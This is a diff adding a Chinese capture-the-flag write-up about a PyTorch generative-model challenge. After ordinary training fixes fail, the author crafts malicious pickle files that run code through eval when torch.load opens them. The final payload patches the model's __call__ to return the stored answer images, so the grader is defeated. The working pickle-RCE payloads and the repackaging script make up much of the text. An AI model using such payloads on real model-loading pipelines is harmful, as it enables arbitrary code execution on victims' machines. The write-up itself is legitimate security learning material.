@@ -1615,11 +1615,213 @@ SimpleGenerativeModel(
 
 ### 初始想法
 
-还没写完
+嗯，我身为一个人工智能相关专业的学生。如果做不出这道题，岂不是太丢脸了。
+
+题目的标签有些奇怪。不过我想了想，神经网络当然也是网络了，打个 Web 标签也不是不可以吗（笑
+
+打开 `infer.py` 可以看到几个值得注意的地方：
+
+<CH.Section>
+
+<CH.Code lineNumbers={true}>
+
+```python infer.py
+...
+def infer(pt_file):
+    # load input data
+    tag_ids = torch.load("dataset/tags_10.pt", map_location="cpu")
+
+    # args
+    n_tags = 63
+    dim = 8
+    img_shape = (64, 64, 3)
+
+    # load model
+    model = SimpleGenerativeModel(n_tags=n_tags, dim=dim, img_shape=img_shape)
+    model.load_state_dict(torch.load(pt_file, map_location="cpu"))
+
+    # generate noise
+    torch.manual_seed(0)
+    n_samples = tag_ids.shape[0]
+    noise = torch.randn(n_samples, dim)
+
+    # forward
+    with torch.no_grad():
+        model.eval()
+        predictions = model(noise, tag_ids).clamp(0, 1)
+
+    gen_imgs = []
+    for i in range(n_samples):
+        out_io = io.BytesIO()
+        matplotlib.image.imsave(out_io, predictions[i].numpy(), format="png")
+        png_b64 = base64.b64encode(out_io.getvalue()).decode()
+        gen_imgs.append(png_b64)
+
+    # save the predictions
+    json.dump({"gen_imgs_b64": gen_imgs}, open("/tmp/result.json", "w"))
+...
+```
+
+```python train.py
+import torch
+from models import SimpleGenerativeModel
+
+def train():
+    # load data
+    tag_ids = torch.load("dataset/tags_10.pt")
+    pixels = torch.load("dataset/pixels_10.pt")
+
+    # build model
+    n_tags = 63
+    dim = 8
+    scale = 1
+    imag_shape = (64, 64, 3)
+    model = SimpleGenerativeModel(n_tags=n_tags, dim=dim, img_shape=imag_shape)
+    optimizer = torch.optim.AdamW(model.parameters(), lr=1e-2)
+
+    # train loop
+    for epoch in range(100):
+        model.train()
+        optimizer.zero_grad()
+        noise = torch.randn(tag_ids.size(0), dim)
+        pixels_pred = model(noise=noise, tag_ids=tag_ids)
+        loss = ((pixels_pred - pixels) ** 2).mean()
+        loss.backward()
+        optimizer.step()
+        print("epoch {}: loss {}".format(epoch, loss.item()))
+
+    # evaluate
+    model.eval()
+    torch.manual_seed(0)
+    noise = torch.randn(tag_ids.size(0), dim)
+    pixels_pred = model(noise=noise, tag_ids=tag_ids).clamp(0, 1)
+    loss = ((pixels_pred - pixels) ** 2).mean(axis=(1, 2, 3))
+    print("Final loss:")
+    for i in range(tag_ids.size(0)):
+        print("   {}: {:.5f}".format(i, loss[i].item()))
+    print("mean: {:.5f}".format(loss.mean().item()))
+    print(" max: {:.5f}".format(loss.max().item()))
+
+    # save model
+    torch.save(model.state_dict(), "checkpoint/model.pt")
+
+if __name__ == "__main__":
+    train()
+```
+
+</CH.Code>
+
+1. [_`torch.manual_seed(0)`_ 把随机数种子给定死了](focus://infer.py#1:34)，我们在训练的时候直接使用这个种子生成出来的第一个噪声就可以，[原始训练脚本在每个 epoch 里都去生成噪声](focus://train.py#21)对于做这道题而言是有害的。
+1. 题目最后是[拿 `max loss` 来衡量我们模型好坏的](focus://train.py#38)，但是我们[在模型训练的时候却是用的 `average loss` 来衡量模型的好坏](focus://train.py#23:26)。
+
+:::danger
+
+对于 _`torch.manual_seed(0)`_ 而言，在 GPU 上生成的随机数和在 CPU 上生成的随机数是不同的。这是一个很大的坑。我把我训练了一段时间的模型交上去的时候才发现这个问题。你需要在 CPU 上生成随机数然后再把它复制到 GPU 上。（然而浪费的算力和碳排放已经无法挽回了。~~不过给这道题训练模型本身就不值得~~
+
+:::
+
+然后我就把这几点不足之处都修正了，改成 GPU 训练，调了半天超参，最后也没能把 `max loss` 给降到 `0.0005`. 啊对，我还换了几次优化器，一通魔改，最后发现效果都不如 `AdamW` 好。
+
+</CH.Section>
 
 ### 失败的尝试
 
+后来想了想，可能需要构造一个模型来实现 RCE. 毕竟模型的加载是不安全的。 pytorch 内部使用不安全的 `pickle` 来加载模型。
+
+那么，我们直接把答案JSON 文件 `print` 出来不就完了。但是 pytorch 接下来会报错，那我就直接调用 `sys.exit` 退出程序呗。
+
+直接把  JSON 贴进 Python 程序里不可行，还要再转义，于是我直接又给它套了一层 base64.
+
+```python
+import pickle
+
+class Exploit:
+    def __reduce__(self):
+        return (eval, (r"(print(__import__('base64').urlsafe_b64decode('BASE64串').decode()),__import__('sys').exit(0))[0]",))
+
+
+with open("data.pt", "wb") as f:
+    data = Exploit()
+    pickle.dump(data, f)
+```
+
+然后本地运行成功了。但是交上去却报错了。我还发了个邮件问组委会，得到的回答是：
+
+> 经过确认，题目环境没有问题，您目前的 payload 得到这样的提示是预期的。祝  参赛愉快。 
+
+我左思右想也没想出为什么。于是我写了一个更加 `hacky` 的版本来过掉这道题。
+
+比赛结束之后看了别人的 Write Up 我才知道是要把结果写到 `result.json` 里面去。我一直以为只要像 `infer.py` 结尾那样把它 `print` 出来就行。
+
 ### 成功拿到 flag
+
+这是一个非常 Hacky 的版本。
+
+- 它不会让 `infer.py` 异常退出
+-  `pytorch` 会正常的，顺利的加载模型
+- `infer.py` 会看似正常的调用我们的模型
+- 总体而言，我们没有改变 `infer.py` 的执行流程
+
+首先，我们把原来的模型解包，得到 `archive` 文件夹，其中有一个 `data.pkl` 存储了状态字典，`data.pkl` 内引用了压缩包里的其他几个文件。
+
+我们先构造一段填充合法权重的代码：
+
+```python fill_weight.py
+import pickle
+import torch
+
+model = torch.load("orig_model.pt")
+fff = [(k, f'torch.ones({tuple(v.shape)})') for k, v in model.items()]
+print(str(fff).replace("'torch", "torch").replace(")'", ')'))
+```
+
+得到
+
+```python
+[('tag_encoder.embedding.weight', torch.ones((63, 8))), ('model.0.weight', torch.ones((8, 16))), ('model.0.bias', torch.ones((8,))), ('model.2.weight', torch.ones((8, 8))), ('model.2.bias', torch.ones((8,))), ('model.4.weight', torch.ones((12288, 8))), ('model.4.bias', torch.ones((12288,)))]
+```
+
+给它包上 `OrderedDict`:
+
+```python
+__import__('collections').OrderedDict([('tag_encoder.embedding.weight', torch.ones((63, 8))), ('model.0.weight', torch.ones((8, 16))), ('model.0.bias', torch.ones((8,))), ('model.2.weight', torch.ones((8, 8))), ('model.2.bias', torch.ones((8,))), ('model.4.weight', torch.ones((12288, 8))), ('model.4.bias', torch.ones((12288,)))])
+```
+
+然后我们构造 payload:
+
+<CH.Section>
+
+```python payload.py
+import pickle
+
+class Exploit:
+    def __reduce__(self):
+        return (eval, ("(0,setattr(__import__('models').SimpleGenerativeModel, '__call__', lambda *x: __import__('torch').load('dataset/pixels_10.pt')),上面的那段OrderedDict抄到这里)[-1]",))
+
+with open("data.pt", "wb") as f:
+    data = Exploit()
+    pickle.dump(data, f, protocol=2)
+```
+
+我们直接引入 `models.py` 里的 _`SimpleGenerativeModel`_， 把它的 _`__call__`_ 篡改为 _`lambda *x: __import__('torch').load('dataset/pixels_10.pt')`_. 
+
+也就是说， `infer.py` 在调用模型的时候，我们会直接把磁盘上保存的原始图像数据返回给它。
+
+除此之外，我们的 payload 在执行的时候，会把一个合适的状态字典返回给 pytorch 的加载函数，pytorch 不会做出任何抱怨。
+
+调用 `payload.py` 生成的 `data.pt` 并不是最终结果，最后还要写个 shell 脚本把生成的 payload 重新打包：
+
+```shell
+#/bin/bash
+
+cp data.pt archive/data.pkl
+rm payload.pt
+zip -r payload.pt archive
+```
+
+把 `payload.pt` 传上去就通过了
+
+</CH.Section>
 
 ## 光与影
 
